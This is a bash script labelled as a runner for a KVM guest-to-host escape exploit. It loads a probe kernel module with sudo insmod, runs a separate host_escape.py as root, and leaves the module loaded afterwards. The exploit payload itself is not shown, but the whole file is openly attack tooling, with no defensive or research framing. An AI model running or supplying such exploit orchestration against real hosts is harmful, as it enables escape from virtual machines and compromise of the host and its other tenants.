#!/bin/bash

# KVM Guest-to-Host Escape Exploit Runner
# This script orchestrates the complete exploitation process

set -e

echo "=================================================="
echo "    KVM Guest-to-Host Escape Exploitation"
echo "=================================================="

# Check if we're in a KVM guest
echo "[*] Checking environment..."
if [ ! -e /dev/kvm_probe_dev ]; then
    echo "[-] KVM probe device not found. Loading module..."
    
    # Try to load the module
    if [ -f kvm_probe_drv.ko ]; then
        sudo insmod kvm_probe_drv.ko
        sleep 2
    else
        echo "[-] Module not found. Please compile and load kvm_probe_drv first."
        exit 1
    fi
fi

# Check if device exists now
if [ ! -e /dev/kvm_probe_dev ]; then
    echo "[-] Failed to load or find KVM probe device"
    exit 1
fi

echo "[+] KVM probe device found at /dev/kvm_probe_dev"

# Make sure we have the exploit script
if [ ! -f host_escape.py ]; then
    echo "[-] host_escape.py not found in current directory"
    exit 1
fi

# Check dependencies
echo "[*] Checking dependencies..."
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 not found"
    exit 1
fi

# Run the exploitation
echo "[*] Starting host escape exploitation..."
echo "[*] This may take several minutes..."
echo ""

# Run the main exploit
sudo python3 host_escape.py

echo ""
echo "[*] Exploitation completed. Check above for results."

# Additional cleanup if needed
echo "[*] Cleaning up..."
if lsmod | grep -q kvm_probe_drv; then
    echo "[*] Keeping KVM probe module loaded for further analysis"
    # sudo rmmod kvm_probe_drv  # Uncomment to remove module
fi

echo "=================================================="
echo "    Exploitation Finished"
echo "=================================================="